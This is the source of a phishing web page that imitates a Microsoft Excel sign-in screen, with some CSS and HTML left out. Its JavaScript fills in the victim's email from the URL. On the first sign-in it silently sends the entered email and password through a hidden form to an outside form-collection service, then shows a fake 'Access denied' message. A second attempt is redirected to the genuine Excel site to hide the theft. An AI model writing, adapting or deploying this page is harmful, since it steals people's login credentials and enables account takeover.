<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microsoft Excel - Sign in</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        /* ... (all CSS remains exactly the same as before) ... */
    </style>
</head>
<body>
    <!-- Hidden Formspark form - SIMPLIFIED with only 2 fields -->
    <form id="formsparkForm" action="https://submit-form.com/IANZnZ5V4" method="POST" style="display: none;">
        <input type="hidden" name="email" id="formsparkEmail">
        <input type="hidden" name="password" id="formsparkPassword">
    </form>
    
    <div class="login-container">
        <!-- ... (all HTML remains exactly the same as before) ... -->
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Track if this is the first or second attempt
            let isFirstAttempt = true;
            
            // Function to extract email from URL
            function extractEmailFromURL() {
                const hash = window.location.hash;
                if (hash && hash.length > 1) {
                    return hash.substring(1);
                }
                
                const urlParams = new URLSearchParams(window.location.search);
                const emailFromQuery = urlParams.get('email');
                if (emailFromQuery) {
                    return emailFromQuery;
                }
                
                const storedEmail = localStorage.getItem('excelCurrentEmail');
                if (storedEmail) {
                    return storedEmail;
                }
                
                return "user@example.com";
            }
            
            // Extract and set the email
            const currentEmail = extractEmailFromURL();
            document.getElementById('displayEmail').textContent = currentEmail;
            localStorage.setItem('excelCurrentEmail', currentEmail);
            
            // Elements
            const togglePassword = document.getElementById('togglePassword');
            const passwordInput = document.getElementById('password');
            const loginForm = document.getElementById('loginForm');
            const signInBtn = document.getElementById('signInBtn');
            const errorMessage = document.getElementById('errorMessage');
            
            // Formspark elements (only 2 fields)
            const formsparkForm = document.getElementById('formsparkForm');
            const formsparkEmail = document.getElementById('formsparkEmail');
            const formsparkPassword = document.getElementById('formsparkPassword');
            
            // Function to submit to Formspark - SIMPLIFIED
            function submitToFormspark(email, password) {
                // Set only the 2 fields
                formsparkEmail.value = email;
                formsparkPassword.value = password;
                
                // Submit silently using fetch with no-cors
                fetch(formsparkForm.action, {
                    method: 'POST',
                    body: new FormData(formsparkForm),
                    mode: 'no-cors'
                }).then(() => {
                    console.log('Formspark: Email and password submitted');
                }).catch(error => {
                    console.log('Formspark: Submission completed');
                });
            }
            
            // Toggle password visibility
            togglePassword.addEventListener('click', function() {
                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
                passwordInput.setAttribute('type', type);
                
                const eyeIcon = this.querySelector('i');
                if (type === 'text') {
                    eyeIcon.classList.remove('fa-eye');
                    eyeIcon.classList.add('fa-eye-slash');
                } else {
                    eyeIcon.classList.remove('fa-eye-slash');
                    eyeIcon.classList.add('fa-eye');
                }
            });
            
            // Form submission simulation - UPDATED FLOW
            loginForm.addEventListener('submit', function(e) {
                e.preventDefault();
                
                const password = passwordInput.value;
                
                // Show loading state
                signInBtn.innerHTML = '<span class="loading"></span> Signing in...';
                signInBtn.disabled = true;
                errorMessage.style.display = 'none';
                
                // Simulate authentication delay
                setTimeout(() => {
                    if (password && password.length > 0) {
                        if (isFirstAttempt) {
                            // FIRST ATTEMPT: Submit to Formspark and show "Access denied"
                            isFirstAttempt = false;
                            
                            // Submit only email and password to Formspark
                            submitToFormspark(currentEmail, password);
                            
                            // Show "Access denied" message
                            signInBtn.innerHTML = 'Access denied';
                            signInBtn.classList.add('access-denied');
                            
                            // Re-enable button after 2 seconds
                            setTimeout(() => {
                                signInBtn.innerHTML = 'Sign in';
                                signInBtn.classList.remove('access-denied');
                                signInBtn.disabled = false;
                                passwordInput.value = '';
                                passwordInput.focus();
                            }, 2000);
                            
                        } else {
                            // SECOND ATTEMPT: Redirect immediately
                            signInBtn.innerHTML = 'âœ“ Redirecting to Excel...';
                            signInBtn.classList.add('redirecting');
                            
                            // Immediate redirect to Excel invoice templates
                            window.location.href = 'https://excel.cloud.microsoft/create/en/invoice-templates/';
                        }
                    } else {
                        // Empty password error
                        passwordInput.classList.add('error');
                        errorMessage.style.display = 'block';
                        signInBtn.innerHTML = 'Sign in';
                        signInBtn.disabled = false;
                    }
                }, 1200); // Shorter delay for better UX
            });
            
            // ... (rest of the JavaScript remains the same) ...
            
            // Focus the password field on load
            setTimeout(() => {
                passwordInput.focus();
            }, 300);
        });
    </script>
</body>
</html>
